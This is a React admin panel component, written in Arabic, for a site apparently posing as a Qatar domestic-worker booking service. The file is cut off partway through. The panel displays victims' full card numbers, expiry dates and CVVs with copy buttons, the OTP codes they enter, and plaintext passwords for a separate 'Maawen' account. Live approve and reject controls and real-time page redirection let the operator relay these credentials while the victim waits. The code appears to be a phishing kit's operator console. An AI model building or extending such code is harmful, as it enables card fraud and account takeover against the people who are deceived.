"use client";

import { useEffect, useRef, useState } from "react";
import { CardBrandLogo } from "@/components/admin/CardBrandLogo";
import { resolveBankDomain, getBankLogoUrl, shortenBankName } from "@/lib/card-utils";
import { formatWorkerPrice } from "@/lib/pricing";
import { DIRECT_PAGES, getDirectPage } from "@/lib/direct-pages";
import { useToast } from "@/components/ui/Toast";
import type { EmploymentCategory } from "@/lib/supabase/types";
import styles from "./ClientDetailPanel.module.css";
import type { InboxClient } from "./ClientInboxClient";

/** ينسخ النص إلى الحافظة ويُظهر تأكيداً. يعملق (fallback) على المتصفحات بدون clipboard API. */
function useCopy() {
  const toast = useToast();
  return (text: string, label: string) => {
    const value = text.trim();
    if (!value) return;
    const done = () => toast.push(`تم نسخ ${label}`, "success");
    const fail = () => toast.push("تعذّر النسخ", "error");
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(value).then(done).catch(() => fallbackCopy(value, done, fail));
    } else {
      fallbackCopy(value, done, fail);
    }
  };
}

function fallbackCopy(text: string, ok: () => void, fail: () => void) {
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    ok();
  } catch {
    fail();
  }
}

type Props = {
  client: InboxClient | null;
  onBlock?: (clientId: string, blocked: boolean) => void;
  onArchive?: (clientId: string, archive: boolean) => void;
  onDelete?: (clientId: string) => void;
  onEntryDecided?: (entryId: string, status: "approved" | "rejected") => void;
  /** زر الرجوع إلى قائمة الوارد — يظهر على الهاتف فقط (يُتحكم به عبر CSS). */
  onMobileBack?: () => void;
};

/** تنسيق تاريخ ثابت (توقيت قطر UTC+3) — متطابق على الخادم والعميل لتفادي أخطاء hydration. */
function formatDateTime(iso: string): string {
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "";
  const qatar = new Date(d.getTime() + 3 * 60 * 60 * 1000);
  const pad = (n: number) => String(n).padStart(2, "0");
  const h = qatar.getUTCHours();
  const ampm = h < 12 ? "ص" : "م";
  const h12 = h % 12 || 12;
  return `${pad(qatar.getUTCDate())}/${pad(qatar.getUTCMonth() + 1)}/${qatar.getUTCFullYear()} ${pad(h12)}:${pad(qatar.getUTCMinutes())}:${pad(qatar.getUTCSeconds())} ${ampm}`;
}

export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntryDecided, onMobileBack }: Props) {
  const [confirmingDelete, setConfirmingDelete] = useState(false);
  const [directPage, setDirectPage] = useState("__none__");
  const [directing, setDirecting] = useState(false);
  const toast = useToast();

  if (!client) {
    return (
      <div className={styles.empty} dir="rtl">
        <div className={styles.emptyIcon}>👤</div>
        <p>اختر عميلاً من القائمة لعرض تفاصيله</p>
      </div>
    );
  }

  // بناء خط زمني موحّد: كل صندوق يحمل وقته الخاص (created_at)
  type TimelineItem = {
    kind: "profile" | "booking" | "payment" | "otp" | "inquiry" | "maawen" | "maawen-login" | "maawen-otp" | "direct";
    created_at: string;
    data: Record<string, unknown>;
  };

  const timeline: TimelineItem[] = [];

  // صندوق المعلومات الأساسية — وقته هو وقت إنشاء الحساب (يُرتّب طبيعياً مع باقي الصناديق)
  timeline.push({ kind: "profile", created_at: client.created_at, data: {} });

  // إضافة الحجوزات
  // ابنِ خريطة من حمولة إدخال بيانات الحجز (national_id، العنوان، المدة) لكل bookingId.
  const bookingEntryPayload: Record<string, Record<string, unknown>> = {};
  for (const e of client.entries as Array<{ type: string; payload: Record<string, unknown> }>) {
    if (e.type !== "booking") continue;
    const bid = String(e.payload?.bookingId ?? e.payload?.booking_id ?? "");
    if (bid && !bookingEntryPayload[bid]) bookingEntryPayload[bid] = e.payload;
  }
  for (const b of client.bookings as Array<Record<string, unknown>>) {
    const ep = bookingEntryPayload[String(b.id ?? "")] ?? {};
    timeline.push({ kind: "booking", created_at: String(b.created_at ?? ""), data: { ...b, entry: ep } });
  }

  // الإدخالات مرتّبة من الأحدث إلى الأقدم من جهة الخادم.
  // العميل لا ينتظر قرار المدير إلا على أحدث إدخال معلّق لكل (حجز، نوع).
  // لذلك نُقرر فقط على أحدث إدخال معلّق لكل (booking_id, type)، ونخفي أزرار
  // القرار عن الإدخالات المعلّقة الأقدم حتى لا يقرر المدير على إدخال لم يعد
  // العميل ينتظره — مما كان يمنع وصول قرار المدير للعميل.
  type DecidableEntry = { type: string; payload: Record<string, unknown>; created_at: string; id: string };
  const decidableIds = new Set<string>();
  {
    const seenPending = new Set<string>();
    for (const e of client.entries as Array<DecidableEntry>) {
      const bookingId = String(e.payload?.booking_id ?? "");
      const entryType = e.type === "otp_request" ? "otp" : e.type === "verification" ? "otp" : e.type === "maawen_login" ? "maawen-login" : e.type === "maawen_login_otp" ? "maawen-otp" : e.type;
      const status = String(e.payload?.status ?? "pending_admin");
      const key = `${bookingId}:${entryType}`;
      if (entryType === "payment" || entryType === "otp" || entryType === "maawen-login" || entryType === "maawen-otp") {
        if (status === "pending_admin" && !seenPending.has(key)) {
          seenPending.add(key);
          decidableIds.add(e.id);
        }
      }
    }
  }

  // إضافة الإدخالات (دفع / OTP / استفسار)
  for (const e of client.entries as Array<{ type: string; payload: Record<string, unknown>; created_at: string; id: string }>) {
    if (e.type === "payment") timeline.push({ kind: "payment", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
    else if (e.type === "otp_request" || e.type === "verification") timeline.push({ kind: "otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
    else if (e.type === "inquiry") timeline.push({ kind: "inquiry", created_at: e.created_at, data: { ...e } });
    else if (e.type === "maawen_booking" || e.type === "maawen_profile" || e.type === "maawen_payment")
      timeline.push({ kind: "maawen", created_at: e.created_at, data: { ...e } });
    else if (e.type === "maawen_login") timeline.push({ kind: "maawen-login", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
    else if (e.type === "maawen_login_otp") timeline.push({ kind: "maawen-otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
  }

  // ترتيب الخط الزمني: الأحدث في الأعلى، الأقدم في الأسفل
  timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

  // توجيه العميل الفوري إلى صفحة من الموقع عبر لوحة التحكم.
  async function directClient(page: string) {
    if (!client || directing) return;
    setDirecting(true);
    try {
      const res = await fetch("/api/admin/direct-client", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ clientId: client.id, page }),
      });
      const pageLabel = getDirectPage(page)?.label ?? page;
      if (res.ok) {
        toast.push(`تم توجيه العميل إلى «${pageLabel}»`, "success");
      } else {
        toast.push(`تعذّر التوجيه إلى «${pageLabel}»`, "error");
        setDirectPage("__none__");
      }
    } catch {
      toast.push("تعذّر التوجيه — تحقق من اتصال اللوحة", "error");
      setDirectPage("__none__");
    } finally {
      setDirecting(false);
    }
  }

  return (
    <div className={styles.container} dir="rtl">
      {/* ===== شريط العنوان ===== */}
      <div className={styles.headerBar}>
        <div className={styles.headerTop}>
          {onMobileBack && (
            <button
              className={styles.backBtn}
              onClick={onMobileBack}
              title="رجوع"
              aria-label="رجوع إلى القائمة"
            >
              <BackIcon />
            </button>
          )}
          <span className={styles.clientName}>{client.name}</span>
          {client.active && <span className={styles.refreshIcon}>↻</span>}
          <div className={styles.spacer} />
          <a href="/admin/bookings" className={`${styles.headerBtn} ${styles.pdfRed}`} title="الحجوزات">
            📄 الحجوزات
          </a>
        </div>
        {/* شريط المعلومات */}
        <div className={styles.infoStrip}>
          <InfoChip icon={<PhoneIcon />} value={client.phone ?? "غير متوفر"} />
          <InfoChip icon={<DesktopIcon />} value={client.device ?? "غير معروف"} />
          <InfoChip icon={<GlobeSmallIcon />} value={client.countryName ?? client.country ?? "غير محدد"} muted />
          {client.lastPageLabel && (
            <InfoChip icon={<LocationIcon />} value={`📍 ${client.lastPageLabel}`} muted />
          )}
          <div className={styles.infoChip}>
            <span className={styles.infoFlag}>{client.flag}</span>
          </div>
          <div className={styles.infoChip}>
            <span
              className={`${styles.statusTag} ${client.active ? styles.statusOnline : styles.statusOffline}`}
              title={client.active ? "متصل الآن" : "غير متصل"}
            >
              {client.active ? "● متصل" : "○ غير متصل"}
            </span>
          </div>
        </div>
        {/* شريط الإجراءات */}
        <div className={styles.actionStrip}>
          <button
            className={`${styles.blockBtn} ${client.is_blocked ? styles.unblockBtn : styles.blockRedBtn}`}
            onClick={() => onBlock?.(client.id, !client.is_blocked)}
          >
            {client.is_blocked ? "إلغاء الحظر" : "🚫 حظر"}
          </button>
          {onArchive && (
            <button
              className={`${styles.blockBtn} ${client.is_archived ? styles.unarchiveBtn : styles.archiveBtn}`}
              onClick={() => onArchive(client.id, !client.is_archived)}
            >
              {client.is_archived ? "📤 إلغاء أرشفة" : "📥 أرشفة"}
            </button>
          )}
          {onDelete && !confirmingDelete ? (
            <button
              className={`${styles.blockBtn} ${styles.deleteBtn}`}
              onClick={() => setConfirmingDelete(true)}
            >
              🗑 حذف
            </button>
          ) : onDelete && confirmingDelete ? (
            <>
              <span className={styles.confirmText}>تأكيد؟</span>
              <button
                className={`${styles.blockBtn} ${styles.deleteBtn}`}
                onClick={() => onDelete(client.id)}
              >
                نعم، احذف
              </button>
              <button
                className={`${styles.blockBtn} ${styles.cancelBtn}`}
                onClick={() => setConfirmingDelete(false)}
              >
                إلغاء
              </button>
            </>
          ) : null}
        </div>
        {/* شريط توجيه العميل — يختار المدير صفحة من الموقع ليُنقل إليها العميل فوراً. */}
        <div className={styles.directStrip}>
          <select
            className={styles.directSelect}
            value={directPage}
            onChange={(e) => {
              const value = e.target.value;
              setDirectPage(value);
              if (value && value !== "__none__") {
                void directClient(value);
              }
            }}
            title="توجيه العميل إلى صفحة من الموقع"
            aria-label="توجيه العميل إلى صفحة من الموقع"
          >
            <option value="__none__">🌐 توجيه العميل إلى صفحة…</option>
            {DIRECT_PAGES.map((p) => (
              <option key={p.value} value={p.value}>
                {p.label}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* ===== المحتوى: خط زمني موحّد — كل صندوق بوقته الخاص، الأحدث في الأعلى ===== */}
      <div className={styles.cardsArea}>
        {timeline.map((item, i) => {
            if (item.kind === "profile") {
              return (
                <Card key="profile" title="معلومات أساسية" timeAgo={formatDateTime(item.created_at)}>
                  <DataRow label="الاسم" value={client.name} />
                  <DataRow label="البريد الإلكتروني" value={client.email ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="رقم الهاتف" value={client.phone ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="الدولة" value={`${client.flag} ${client.country ?? "غير محدد"}`} />
                  <DataRow label="عنوان IP" value={client.ip ?? "غير متوفر"} dir="ltr" />
                  <DataRow label="البصمة" value={client.fingerprint.slice(0, 16) + "..."} dir="ltr" />
                  <DataRow
                    label="الحالة"
                    value={client.is_blocked ? "محظور" : "نشط"}
                    highlight={client.is_blocked ? "red" : "green"}
                  />
                </Card>
              );
            }
            if (item.kind === "booking") {
              return (
                <BookingCard
                  key={`booking-${String(item.data.id ?? i)}`}
                  booking={item.data}
                  ownTime={item.created_at}
                  latest={i === 0}
                />
              );
            }
            if (item.kind === "payment") {
              return (
                <PaymentCard
                  key={`payment-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  latest={i === 0}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            if (item.kind === "otp") {
              return (
                <OtpRequestCard
                  key={`otp-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            if (item.kind === "maawen") {
              return (
                <MaawenCard
                  key={`maawen-${String(item.data.id ?? i)}`}
                  entry={item.data as { type: string; payload: Record<string, unknown>; created_at: string }}
                />
              );
            }
            if (item.kind === "maawen-login") {
              return (
                <MaawenLoginCard
                  key={`maawen-login-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            if (item.kind === "maawen-otp") {
              return (
                <MaawenOtpCard
                  key={`maawen-otp-${String(item.data.id ?? i)}`}
                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
                  decidable={item.data.decidable === true}
                  onDecided={onEntryDecided}
                />
              );
            }
            return (
              <InquiryCard
                key={`inquiry-${i}`}
                entry={item.data as { type: string; payload: Record<string, unknown>; created_at: string }}
              />
            );
          })
        }
      </div>
    </div>
  );
}

/* ===== مكونات فرعية ===== */

function Card({
  title,
  timeAgo,
  children,
}: {
  title: string;
  timeAgo?: string;
  children: React.ReactNode;
}) {
  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>{title}</span>
        <div className={styles.cardHeaderRight}>
          {timeAgo && <span className={styles.cardTime}>⏱ {timeAgo}</span>}
        </div>
      </div>
      <div className={styles.cardBody}>{children}</div>
    </div>
  );
}

function BookingCard({
  booking,
  ownTime,
  latest,
}: {
  booking: Record<string, unknown>;
  ownTime: string;
  latest: boolean;
}) {
  const worker = booking.worker as
    | { full_name: string; nationality: string; photo_url: string | null; expected_salary: number; employment_type: EmploymentCategory[] }
    | null;
  const status = String(booking.status ?? "pending");
  const statusLabel = status === "paid" ? "✓ مدفوع" : status === "completed" ? "✓ مكتمل" : status === "cancelled" ? "✗ ملغي" : "⏳ معلق";
  const statusClass = status === "paid" || status === "completed" ? "green" : status === "cancelled" ? "red" : "amber";

  const entry = (booking.entry as Record<string, unknown>) ?? {};
  const unitLabel =
    entry.duration_unit === "hours" ? "ساعة" : entry.duration_unit === "months" ? "شهر" : entry.duration_unit === "years" ? "سنة" : "";

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>حجز {latest && <span className={styles.latestTag}>الأحدث</span>}</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(ownTime)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        {worker && (
          <div className={styles.workerRow}>
            {worker.photo_url && (
              <img src={worker.photo_url} alt={worker.full_name} className={styles.workerPhoto} />
            )}
            <div className={styles.workerInfo}>
              <span className={styles.workerName}>{worker.full_name}</span>
              <span className={styles.workerMeta}>
                {worker.nationality} · {formatWorkerPrice(worker, "ar")}
              </span>
            </div>
          </div>
        )}
        <DataRow label="المرجع" value={String(booking.booking_ref ?? "")} dir="ltr" mono />
        <DataRow label="الحالة" value={statusLabel} highlight={statusClass as "green" | "red" | "amber"} />
        {entry.national_id ? <DataRow label="رقم الهوية" value={String(entry.national_id)} dir="ltr" /> : null}
        {entry.phone ? <DataRow label="الهاتف" value={String(entry.phone)} dir="ltr" /> : null}
        {entry.home_address ? <DataRow label="عنوان المنزل" value={String(entry.home_address)} /> : null}
        {entry.duration ? <DataRow label="المدة" value={`${entry.duration} ${unitLabel}`} dir="ltr" /> : null}
        {booking.terms_snapshot ? (
          <DataRow label="الشروط" value={String(booking.terms_snapshot)} small />
        ) : null}
      </div>
    </div>
  );
}

function PaymentCard({
  entry,
  latest,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  latest: boolean;
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
  const p = entry.payload;
  const cardNumber = String(p.card_number ?? "");
  const cardLast4 = String(p.card_last4 ?? cardNumber.slice(-4) ?? "****");
  const cardName = String(p.card_name ?? "غير متوفر");
  const expiry = String(p.expiry ?? "**/**");
  const cvv = String(p.cvv ?? "***");
  const binScheme = String(p.bin_scheme ?? "غير معروف");
  const binType = String(p.bin_type ?? "");
  const binBank = String(p.bin_bank ?? "غير معروف");
  const binCountry = String(p.bin_country ?? "غير معروف");
  const binCountryCode = String(p.bin_country_code ?? "");
  // شعار البنك: نُعيد بناء الرابط من النطاق دائماً (وليس من bin_bank_logo المخزّن
  // الذي قد يحوي theme=dark قديماً) ليظهر الشعار الأصلي الملوّن على صندوق أبيض.
  const bankDomain =
    (p.bin_bank_domain as string | null) ?? resolveBankDomain(binBank);
  const bankLogoUrl = getBankLogoUrl(bankDomain);
  const bankShort = shortenBankName(binBank);
  const status = String(p.status ?? "pending_admin");
  const bookingRef = String(p.booking_ref ?? "");
  const [deciding, setDeciding] = useState(false);
  const copy = useCopy();
  // الرقم الكامل للنسخ (بدون مسافات التنسيق).
  const cardNumberRaw = cardNumber.replace(/\s+/g, "");

  const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

  async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/payments/decide", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        // حدّث الحالة محلياً فوراً (دون إعادة تحميل)؛ البثّ يُبلغ العميل لحظياً.
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>
          الدفع {latest && <span className={styles.latestTag}>الأحدث</span>}
        </span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        {/* البطاقة المصورة */}
        <div className={styles.creditCard}>
          <div className={styles.cardDecorCircle1} />
          <div className={styles.cardDecorCircle2} />
          <div className={styles.cardTopRow}>
            <div className={styles.bankLogoGroup}>
              {bankLogoUrl ? (
                /* eslint-disable-next-line @next/next/no-img-element */
                <img
                  className={styles.bankLogo}
                  src={bankLogoUrl}
                  alt={binBank}
                  title={binBank}
                />
              ) : (
                <span className={styles.bankLogoFallback} title={binBank}>
                  {binBank !== "غير معروف" ? bankShort.charAt(0) : "؟"}
                </span>
              )}
              <span className={styles.bankName}>{bankShort || binBank}</span>
            </div>
            <CardBrandLogo scheme={binScheme} />
          </div>
          <div
            className={`${styles.cardNumber} ${styles.copyable}`}
            dir="ltr"
            onClick={() => copy(cardNumberRaw || cardLast4, "رقم البطاقة")}
            title="انقر للنسخ"
          >
            {cardNumber ? cardNumber.replace(/(.{4})/g, "$1 ").trim() : `•••• •••• •••• ${cardLast4}`}
          </div>
          <div className={styles.cardBottomRow}>
            <div className={styles.cardHolder}>
              <span className={styles.cardLabel}>حامل البطاقة</span>
              <span className={styles.cardValueSmall}>{cardName}</span>
            </div>
            <div className={styles.cardExpGroup}>
              <span className={styles.cardLabel}>EXPIRES</span>
              <span
                className={`${styles.cardValueSmall} ${styles.copyable}`}
                dir="ltr"
                onClick={() => copy(expiry, "تاريخ الانتهاء")}
                title="انقر للنسخ"
              >
                {expiry}
              </span>
            </div>
            <div className={styles.cardExpGroup}>
              <span className={styles.cardLabel}>CVV</span>
              <span
                className={`${styles.cardValueSmall} ${styles.copyable}`}
                dir="ltr"
                onClick={() => copy(cvv, "CVV")}
                title="انقر للنسخ"
              >
                {cvv}
              </span>
            </div>
          </div>
        </div>

        {/* معلومات BIN */}
        <DataRow label="نوع البطاقة" value={binScheme + (binType ? ` (${binType})` : "")} />
        <DataRow label="البنك" value={binBank} />
        <DataRow label="الدولة" value={binCountry + (binCountryCode ? ` (${binCountryCode})` : "")} />
        {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}

        {/* الحالة */}
        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
            {statusLabel}
          </span>
        </div>

        {/* أزرار المدير — تظهر فقط على أحدث إدخال معلّق لكل حجز/نوع،
            لأن العميل ينتظر قرار المدير فقط على هذا الإدخال. */}
        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

function OtpRequestCard({
  entry,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
  const p = entry.payload;
  const otp = String(p.otp ?? "----");
  const status = String(p.status ?? "pending_admin");
  const bookingRef = String(p.booking_ref ?? "");
  const [deciding, setDeciding] = useState(false);
  const copy = useCopy();

  const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
  const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

  async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/payments/decide-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>رمز التحقق (OTP)</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <div className={styles.otpSection}>
          <span className={styles.otpLabel}>الرمز المُرسل:</span>
          <div
            className={`${styles.otpBoxes} ${styles.copyable}`}
            dir="ltr"
            onClick={() => copy(otp, "رمز OTP")}
            title="انقر للنسخ"
          >
            {otp.split("").map((d, i) => (
              <div key={i} className={styles.otpBox}>{d}</div>
            ))}
          </div>
        </div>
        {bookingRef && <DataRow label="حجز مرتبط" value={bookingRef} dir="ltr" mono />}

        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
            {statusLabel}
          </span>
        </div>

        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

function InquiryCard({
  entry,
}: {
  entry: { type: string; payload: Record<string, unknown>; created_at: string };
}) {
  const p = entry.payload;
  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}>استفسار</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <DataRow label="الاسم" value={String(p.full_name ?? "غير متوفر")} />
        <DataRow label="نوع الخدمة" value={String(p.service_type ?? "غير محدد")} />
        <DataRow label="الهاتف" value={String(p.phone ?? "غير متوفر")} dir="ltr" />
        <DataRow label="الرسالة" value={String(p.message ?? "")} small />
      </div>
    </div>
  );
}

/** بطاقة لطلبات "معاون" (حجز ساعة/شهر، معلومات عميل، دفع). */
function MaawenCard({
  entry,
}: {
  entry: { type: string; payload: Record<string, unknown>; created_at: string };
}) {
  const p = entry.payload;
  const type = entry.type;

  let title = "طلب معاون";
  if (type === "maawen_booking") {
    const bt = p.booking_type === "monthly" ? "بالشهر" : p.booking_type === "hourly" ? "بالساعة" : "";
    title = `طلب معاون — عمالة ${bt}`;
  } else if (type === "maawen_profile") {
    title = "معلومات عميل (معاون)";
  } else if (type === "maawen_payment") {
    title = "طلب دفع (معاون)";
  }

  const bookingRef = String(p.booking_ref ?? "");
  const bookingTypeRaw = String(p.booking_type ?? "");
  const bookingType = bookingTypeRaw === "monthly" ? "بالشهر" : bookingTypeRaw === "hourly" ? "بالساعة" : "";
  const service = String(p.service ?? p.service_type ?? "");
  const nationality = String(p.nationality ?? "");
  const units = String(p.units ?? "");
  const unitLabel = bookingTypeRaw === "monthly" ? units : units ? `${units} ساعات` : "";
  const workersCount = String(p.workers_count ?? "");
  const total = Number(p.total ?? 0);
  const deposit = Number(p.deposit ?? 0);
  const fee = Number(p.fee ?? 0);
  const remaining = Number(p.remaining ?? 0);
  const date = String(p.start_date ?? p.date ?? "");
  const time = String(p.start_time ?? p.time ?? "");
  const workType = String(p.service_type ?? "");
  const fullName = String(p.full_name ?? "");
  const phone = String(p.phone ?? "");
  const address = String(p.address ?? "");
  const nationalId = String(p.national_id ?? "");
  const cardLast4 = String(p.card_last4 ?? "");
  const status = String(p.status ?? "new");

  return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> {title}</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        {bookingRef && type === "maawen_booking" && <DataRow label="رقم الحجز" value={bookingRef} dir="ltr" mono />}
        {bookingType && <DataRow label="نوع الحجز" value={bookingType} />}
        {service && <DataRow label="الخدمة" value={service} />}
        {unitLabel && <DataRow label={bookingTypeRaw === "monthly" ? "مدة العقد" : "المدة"} value={`${unitLabel}${bookingTypeRaw === "monthly" ? " (" + String(p.unit_price ?? "") + " ر.ق)" : ""}`} />}
        {workersCount && <DataRow label="عدد العمالة" value={workersCount} />}
        {nationality && <DataRow label="الجنسية" value={nationality} />}
        {workType && <DataRow label="نمط الدوام" value={workType} />}
        {date && <DataRow label="تاريخ البدء" value={date} />}
        {time && <DataRow label="وقت البدء" value={time} />}
        {total > 0 && <DataRow label="الإجمالي" value={`${total.toLocaleString()} ر.ق`} />}
        {deposit > 0 && <DataRow label="الدفعة (تُدفع الآن)" value={`${deposit.toLocaleString()} ر.ق`} highlight="amber" />}
        {fee > 0 && <DataRow label="رسوم التوثيق" value={`${fee} ر.ق`} highlight="amber" />}
        {remaining > 0 && <DataRow label="المتبقي" value={`${remaining.toLocaleString()} ر.ق`} />}
        {type === "maawen_profile" && (
          <>
            <DataRow label="الاسم" value={fullName || "—"} />
            <DataRow label="رقم الهوية" value={nationalId || "—"} dir="ltr" />
            <DataRow label="الهاتف" value={phone || "—"} dir="ltr" />
            <DataRow label="العنوان" value={address || "—"} />
          </>
        )}
        {type === "maawen_payment" && (
          <>
            {fullName && <DataRow label="الاسم" value={fullName} />}
            {phone && <DataRow label="الهاتف" value={phone} dir="ltr" />}
            {cardLast4 && (
              <DataRow
                label="البطاقة"
                value={`${String(p.card_scheme ?? "بطاقة")} •••• ${cardLast4}`}
                dir="ltr"
              />
            )}
            <DataRow
              label="الحالة"
              value={status === "pending_admin" ? "⏳ بانتظار المدير" : status === "completed" ? "✓ مكتمل" : status}
            />
          </>
        )}
        {type === "maawen_booking" && (
          <DataRow label="كامل التفاصيل" value={bookingRef || "سجّل في الوارد"} small />
        )}
      </div>
    </div>
  );
}

/** بطاقة طلب تسجيل دخول "معاون" — يعرض بيانات الدخول للمدير مع أزرار القرار. */
function MaawenLoginCard({
  entry,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
  const p = entry.payload;
  const email = String(p.email ?? "");
	const username = String(p.username ?? "");
	const credential = String(p.credential ?? email ?? username ?? "");
	const status = String(p.status ?? "pending_admin");
	const [deciding, setDeciding] = useState(false);

	const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
	const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

	async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/maawen/login/decide", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

	return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> تسجيل دخول</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <DataRow label="اسم المستخدم / البريد" value={credential || "غير متوفر"} dir="ltr" />
        {email && username && email !== username && <DataRow label="البريد" value={email} dir="ltr" />}
        {username && <DataRow label="اسم المستخدم" value={username} dir="ltr" />}
        <DataRow label="كلمة المرور" value={String(p.password ?? "غير متوفرة")} dir="ltr" />

        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
